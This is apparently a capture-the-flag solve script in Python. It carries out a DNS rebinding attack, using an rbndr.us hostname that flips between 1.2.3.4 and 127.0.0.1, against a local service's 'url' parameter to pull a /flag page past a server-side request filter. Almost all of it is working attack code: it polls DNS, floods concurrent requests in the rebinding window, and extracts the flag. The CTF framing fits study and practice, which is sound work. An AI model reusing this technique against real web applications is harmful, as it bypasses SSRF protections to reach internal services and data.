import time, re, requests, socket
from concurrent.futures import ThreadPoolExecutor

URL = 'http://localhost:5000'
HOST = '01020304.7f000001.rbndr.us'
PAYLOAD = f'http://{HOST}:5000/flag'

def attack():
    try:
        r = requests.get(URL, params={'url': PAYLOAD}, timeout=8)
        return r.text if 'SSS' in r.text else ''
    except requests.RequestException:
        return ''

with ThreadPoolExecutor(max_workers=20) as pool:
    futures = set()
    end = time.time() + 90

    while time.time() < end:
        try:
            ip = socket.gethostbyname(HOST)
        except socket.gaierror as error:
            print(error)
            time.sleep(1)
            continue

        print(f'dns={ip} active={len(futures)}')
        if ip == '1.2.3.4':
            futures.add(pool.submit(attack))

        for future in list(futures):
            if not future.done():
                continue

            futures.remove(future)
            result = future.result()
            if result:
                FLAG = re.search(r'SSS\{.+?\}', result).group()
                print(f'FLAG: {FLAG}')
                raise SystemExit

        time.sleep(0.15)

print('Not solved')
